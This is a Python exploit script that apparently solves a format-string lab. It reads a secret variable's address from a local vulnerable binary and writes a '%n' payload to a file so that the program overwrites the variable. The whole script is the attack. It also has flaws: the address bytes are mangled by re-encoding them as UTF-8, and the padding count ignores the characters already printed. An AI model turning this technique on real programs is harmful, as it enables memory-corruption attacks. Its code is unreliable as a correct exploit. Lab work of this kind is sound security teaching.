import os
import subprocess

# Define the binary and other constants
binary = "./vul_prog"

def get_secret_address(binary):
    """
    Run the binary and extract the secret variable's address.
    """
    proc = subprocess.Popen(binary, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, _ = proc.communicate()
    # Extract the secret variable's address from the program output
    for line in output.decode().splitlines():
        if "The variable secretâ€™s address" in line:
            addr = line.split()[-1]
            return addr
    return None

def craft_payload(secret_addr, target_value):
    """
    Craft the payload based on the secret address and target value.
    """
    # Convert the secret address to little-endian format
    addr = bytes.fromhex(secret_addr[2:])[::-1].decode('latin-1')

    # Calculate the padding needed to write the target value
    num_chars = target_value
    if num_chars > len(addr):
        padding = "%%%dx" % num_chars
    else:
        padding = ""
    payload = f"{addr} {padding} %n"
    return payload

def run_exploit(binary, payload):
    """
    Execute the binary with the crafted payload.
    """
    with open("vulfile", "wb") as f:
        f.write(payload.encode())
    proc = subprocess.Popen(binary, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, _ = proc.communicate()
    return output.decode()

# Get the secret variable's address
secret_addr = get_secret_address(binary)
if not secret_addr:
    print("Failed to retrieve secret variable's address.")
    exit(1)

print(f"Secret variable's address: {secret_addr}")

# Target value for the secret variable
target_value = 68

# Craft the payload
payload = craft_payload(secret_addr, target_value)
print(f"Crafted payload: {payload}")

# Run the exploit
output = run_exploit(binary, payload)
print("Program output:")
print(output)
